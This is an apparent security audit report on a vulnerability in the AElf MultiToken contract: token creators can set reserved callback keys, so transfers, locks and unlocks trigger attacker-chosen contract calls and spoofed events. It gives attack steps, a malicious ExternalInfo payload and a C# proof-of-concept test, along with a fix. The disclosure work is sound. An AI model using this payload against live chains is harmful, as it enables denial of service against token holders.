# Audit Report

## Title
Reserved External Info Key Collision Enables Arbitrary Contract Execution During Token Operations

## Summary
The MultiToken contract accepts user-provided ExternalInfo during token creation without validating against reserved callback keys. Attackers can create tokens with malicious callbacks that execute automatically during transfer, lock, and unlock operations, enabling denial-of-service attacks, gas exhaustion, and event log pollution.

## Finding Description

The vulnerability exists in the token creation flow where user-provided ExternalInfo is directly assigned without validation. The `CreateToken` method accepts `CreateInput` and directly assigns the user's ExternalInfo to the token: [1](#0-0) 

The system defines four reserved callback keys intended for system-controlled use: [2](#0-1) 

A view function `GetReservedExternalInfoKeyList` exposes these keys, but it is never called for validation during token creation: [3](#0-2) 

The `AssertValidCreateInput` method only validates basic fields (token name length, symbol, decimals) but does not check ExternalInfo: [4](#0-3) 

When tokens are transferred, the contract unconditionally executes any callback specified in ExternalInfo using `Context.SendInline`: [5](#0-4) 

The Transfer method calls this callback function after completing the transfer: [6](#0-5) 

Similar callback execution occurs during lock operations: [7](#0-6) 

And unlock operations: [8](#0-7) 

Additionally, the `aelf_log_event` key allows injecting arbitrary log events that appear to originate from the MultiToken contract: [9](#0-8) 

## Impact Explanation

**Guaranteed Denial of Service (HIGH)**: An attacker can create a token with a callback that reverts. Any user attempting to transfer, lock, or unlock this malicious token will have their transaction fail. This is a straightforward, easily exploitable DoS that affects all holders of the malicious token, as the callback execution is unconditional and happens after balance updates.

**Gas Exhaustion (HIGH)**: Callbacks can contain computationally expensive operations, forcing victims to pay excessive gas fees for attacker-controlled code execution during routine token operations. The attacker controls both the contract address and method name in the CallbackInfo structure.

**Event Log Pollution (MEDIUM)**: The `aelf_log_event` key allows injecting arbitrary events with custom names that appear to originate from the MultiToken contract (Context.Self). This can mislead indexers and applications that trust events from the official token contract.

**Trust Model Breakdown**: The existence of `GetReservedExternalInfoKeyList` indicates these keys were architecturally intended to be system-controlled. Allowing user-set values breaks this security boundary and violates the principle of least privilege.

## Likelihood Explanation

**Attack Prerequisites (LOW BARRIER)**:
- Attacker needs a SEED NFT to create the malicious token, which is obtainable through normal token creation mechanisms
- No special permissions or whitelist membership required beyond SEED ownership
- Token creation flow checks SEED ownership but provides no validation of ExternalInfo content

**Attack Steps**:
1. Acquire SEED NFT for desired token symbol
2. Create malicious token with ExternalInfo containing reserved callback key (e.g., `{"aelf_transfer_callback": "{\"contract_address\":\"<attacker_contract>\",\"method_name\":\"RevertMethod\"}"}`)
3. Distribute tokens to victims via airdrops or legitimate-looking distributions
4. When victims transfer/lock/unlock the token, callbacks execute automatically and cause transaction failure

**No Detection or Prevention**:
- Malicious tokens are indistinguishable from legitimate ones at creation time
- No on-chain validation prevents setting reserved keys during token creation
- No mechanism exists to update or blacklist malicious callbacks after discovery
- The contract never calls `GetReservedExternalInfoKeyList` for validation despite its existence

**High Probability**: The attack is straightforward to execute, economically viable (low cost of SEED NFT), requires no special privileges beyond normal token creation rights, and is difficult to detect until exploited.

## Recommendation

Add validation during token creation to prevent users from setting reserved ExternalInfo keys. The `GetReservedExternalInfoKeyList` method already exists but is not utilized.

**Fix in `CreateToken` method (TokenContract_Actions.cs)**:

Add validation after line 50 (AssertValidCreateInput) and before line 68 (tokenInfo creation):

```csharp
// Validate ExternalInfo does not contain reserved keys
if (input.ExternalInfo != null && input.ExternalInfo.Value.Count > 0)
{
    var reservedKeys = new HashSet<string>
    {
        TokenContractConstants.TransferCallbackExternalInfoKey,
        TokenContractConstants.LockCallbackExternalInfoKey,
        TokenContractConstants.UnlockCallbackExternalInfoKey,
        TokenContractConstants.LogEventExternalInfoKey
    };
    
    foreach (var key in input.ExternalInfo.Value.Keys)
    {
        Assert(!reservedKeys.Contains(key), 
            $"ExternalInfo key '{key}' is reserved and cannot be set by users.");
    }
}
```

This ensures reserved callback keys can only be set by system contracts or authorized governance actions, not by arbitrary token creators.

## Proof of Concept

```csharp
[Fact]
public async Task MaliciousCallbackCausesTransferDoS()
{
    // Setup: Create a malicious contract that reverts
    var maliciousContractAddress = Address.FromString("MaliciousContract");
    
    // Attacker acquires SEED NFT and creates token with malicious callback
    var createInput = new CreateInput
    {
        Symbol = "EVIL",
        TokenName = "Evil Token",
        TotalSupply = 1000000,
        Decimals = 8,
        Issuer = DefaultSender,
        IsBurnable = true,
        ExternalInfo = new ExternalInfo
        {
            Value =
            {
                // Attacker sets reserved callback key
                {
                    TokenContractConstants.TransferCallbackExternalInfoKey,
                    "{\"contract_address\":\"" + maliciousContractAddress + "\",\"method_name\":\"RevertMethod\"}"
                }
            }
        }
    };
    
    // Token creation succeeds - no validation occurs
    await TokenContractStub.Create.SendAsync(createInput);
    
    // Issue tokens to attacker
    await TokenContractStub.Issue.SendAsync(new IssueInput
    {
        Symbol = "EVIL",
        Amount = 1000,
        To = DefaultSender
    });
    
    // Attacker transfers token to victim
    await TokenContractStub.Transfer.SendAsync(new TransferInput
    {
        To = User1Address,
        Symbol = "EVIL",
        Amount = 100
    });
    
    // Victim attempts to transfer token - transaction should fail due to callback
    // This demonstrates the DoS vulnerability
    var result = await TokenContractUser1Stub.Transfer.SendWithExceptionAsync(new TransferInput
    {
        To = User2Address,
        Symbol = "EVIL",
        Amount = 50
    });
    
    // Verify the transaction failed due to malicious callback execution
    result.TransactionResult.Status.ShouldBe(TransactionResultStatus.Failed);
}
```

### Citations

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L68-79)
```csharp
        var tokenInfo = new TokenInfo
        {
            Symbol = input.Symbol,
            TokenName = input.TokenName,
            TotalSupply = input.TotalSupply,
            Decimals = input.Decimals,
            Issuer = input.Issuer,
            IsBurnable = input.IsBurnable,
            IssueChainId = input.IssueChainId == 0 ? Context.ChainId : input.IssueChainId,
            ExternalInfo = input.ExternalInfo ?? new ExternalInfo(),
            Owner = input.Owner
        };
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L180-193)
```csharp
    public override Empty Transfer(TransferInput input)
    {
        var tokenInfo = AssertValidToken(input.Symbol, input.Amount);
        DoTransfer(Context.Sender, input.To, tokenInfo.Symbol, input.Amount, input.Memo);
        DealWithExternalInfoDuringTransfer(new TransferFromInput
        {
            From = Context.Sender,
            To = input.To,
            Amount = input.Amount,
            Symbol = tokenInfo.Symbol,
            Memo = input.Memo
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContractConstants.cs (L13-16)
```csharp
    public const string TransferCallbackExternalInfoKey = "aelf_transfer_callback";
    public const string LockCallbackExternalInfoKey = "aelf_lock_callback";
    public const string UnlockCallbackExternalInfoKey = "aelf_unlock_callback";
    public const string LogEventExternalInfoKey = "aelf_log_event";
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Views.cs (L238-250)
```csharp
    public override StringList GetReservedExternalInfoKeyList(Empty input)
    {
        return new StringList
        {
            Value =
            {
                TokenContractConstants.LockCallbackExternalInfoKey,
                TokenContractConstants.LogEventExternalInfoKey,
                TokenContractConstants.TransferCallbackExternalInfoKey,
                TokenContractConstants.UnlockCallbackExternalInfoKey
            }
        };
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Helper.cs (L272-283)
```csharp
    private void AssertValidCreateInput(CreateInput input, SymbolType symbolType)
    {
        Assert(input.TokenName.Length <= TokenContractConstants.TokenNameLength
               && input.Symbol.Length > 0
               && input.Decimals >= 0
               && input.Decimals <= TokenContractConstants.MaxDecimals, "Invalid input.");

        CheckSymbolLength(input.Symbol, symbolType);
        if (symbolType == SymbolType.Nft) return;
        CheckTokenAndCollectionExists(input.Symbol);
        if (IsAddressInCreateWhiteList(Context.Sender)) CheckSymbolSeed(input.Symbol);
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Helper.cs (L322-335)
```csharp
    private void DealWithExternalInfoDuringLocking(TransferFromInput input)
    {
        var tokenInfo = GetTokenInfo(input.Symbol);
        if (tokenInfo.ExternalInfo == null) return;
        if (tokenInfo.ExternalInfo.Value.ContainsKey(TokenContractConstants.LockCallbackExternalInfoKey))
        {
            var callbackInfo =
                JsonParser.Default.Parse<CallbackInfo>(
                    tokenInfo.ExternalInfo.Value[TokenContractConstants.LockCallbackExternalInfoKey]);
            Context.SendInline(callbackInfo.ContractAddress, callbackInfo.MethodName, input);
        }

        FireExternalLogEvent(tokenInfo, input);
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Helper.cs (L337-350)
```csharp
    private void DealWithExternalInfoDuringTransfer(TransferFromInput input)
    {
        var tokenInfo = GetTokenInfo(input.Symbol);
        if (tokenInfo.ExternalInfo == null) return;
        if (tokenInfo.ExternalInfo.Value.ContainsKey(TokenContractConstants.TransferCallbackExternalInfoKey))
        {
            var callbackInfo =
                JsonParser.Default.Parse<CallbackInfo>(
                    tokenInfo.ExternalInfo.Value[TokenContractConstants.TransferCallbackExternalInfoKey]);
            Context.SendInline(callbackInfo.ContractAddress, callbackInfo.MethodName, input);
        }

        FireExternalLogEvent(tokenInfo, input);
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Helper.cs (L352-365)
```csharp
    private void DealWithExternalInfoDuringUnlock(TransferFromInput input)
    {
        var tokenInfo = GetTokenInfo(input.Symbol);
        if (tokenInfo.ExternalInfo == null) return;
        if (tokenInfo.ExternalInfo.Value.ContainsKey(TokenContractConstants.UnlockCallbackExternalInfoKey))
        {
            var callbackInfo =
                JsonParser.Default.Parse<CallbackInfo>(
                    tokenInfo.ExternalInfo.Value[TokenContractConstants.UnlockCallbackExternalInfoKey]);
            Context.SendInline(callbackInfo.ContractAddress, callbackInfo.MethodName, input);
        }

        FireExternalLogEvent(tokenInfo, input);
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Helper.cs (L367-376)
```csharp
    private void FireExternalLogEvent(TokenInfo tokenInfo, TransferFromInput input)
    {
        if (tokenInfo.ExternalInfo.Value.ContainsKey(TokenContractConstants.LogEventExternalInfoKey))
            Context.FireLogEvent(new LogEvent
            {
                Name = tokenInfo.ExternalInfo.Value[TokenContractConstants.LogEventExternalInfoKey],
                Address = Context.Self,
                NonIndexed = input.ToByteString()
            });
    }
```
